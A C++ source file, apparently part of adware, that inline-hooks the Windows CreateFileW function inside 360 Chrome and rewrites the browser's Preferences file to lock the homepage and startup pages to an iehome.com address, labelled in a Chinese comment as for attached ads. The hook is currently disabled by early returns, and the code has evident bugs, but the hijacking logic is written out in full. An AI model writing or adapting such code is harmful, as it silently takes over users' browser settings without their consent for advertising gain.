#include "CMDRedirect.h"

#include "custom_360chrome.h"

#include "JsonControl\json.h"
#include "HookControl\InlineHook.h"

namespace {
	typedef HANDLE (WINAPI * __pfnCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
}

namespace {
	__pfnCreateFileW pfnCreateFileW = NULL;

	HANDLE WINAPI FakeCreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
		void * pCallAddress = NULL;

		if (dwDesiredAccess != GENERIC_READ || dwCreationDisposition != OPEN_EXISTING) {
			return pfnCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
		}

		return pfnCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
		GetRetAddress(pCallAddress);
		if (Common::GetModuleHandleByAddr(pCallAddress) == Common::GetModuleHandleByAddr(FakeCreateFileW)) {
			return pfnCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
		}

		if (lpFileName && NULL != wcsstr(lpFileName,L"\\Preferences")) {

			char * pszFilePath = Common::WSTR2STR(lpFileName, NULL);

			if (NULL == pszFilePath) {
				return pfnCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
			}

			FILE * filePreferences = fopen(pszFilePath, "r+");

			free(pszFilePath);

			if (NULL == filePreferences) {
				return pfnCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
			}

			fseek(filePreferences, 0, SEEK_END);
			size_t sizeFileSize = ftell(filePreferences);
			fseek(filePreferences, 0, SEEK_SET);

			char * pFileContext = (char *)malloc(sizeFileSize);

			if (0 == fread(pFileContext, 1, sizeFileSize, filePreferences)) {
				fclose(filePreferences);
				return pfnCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
			}

			Json::Value jsonValue;
			Json::Reader jsonReader;

			if (false == jsonReader.parse(pFileContext, jsonValue)) {
				fclose(filePreferences);
				return pfnCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
			}

			jsonValue["homepage_is_newtabpage"] = false;
			jsonValue["homepage"] = "http://www.iehome.com/?lock";

			jsonValue["session"]["restore_on_startup"] = 0;
			jsonValue["session"]["urls_to_restore_on_startup"] = "http://www.iehome.com/?lock";

			std::string strContent = jsonValue.toStyledString();


			if (0 == fwrite(strContent.c_str(), strContent.size(),1,filePreferences)) {
				fclose(filePreferences);
				return pfnCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
			}

			fclose(filePreferences);
			return pfnCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
		}

		return pfnCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
	}
}

namespace Hook {

	bool Start360ChromeHook()
	{
		return false; // 会导致 360 chrome 打不开页面，显示白板。具体原因不详
		bool bIsHook = true;

		// 所有附加广告
		if (NULL == pfnCreateFileW) {
			bIsHook = HookControl::InlineHook(GetProcAddress(LoadLibrary(_T("Kernel32.dll")), "CreateFileW"), FakeCreateFileW, (void **)&pfnCreateFileW);

			Global::Log.Print(LOGOutputs, _T("[HOOK] start hook control CreateFileW stutus is %u."), bIsHook);
		}

		return bIsHook;
	}
}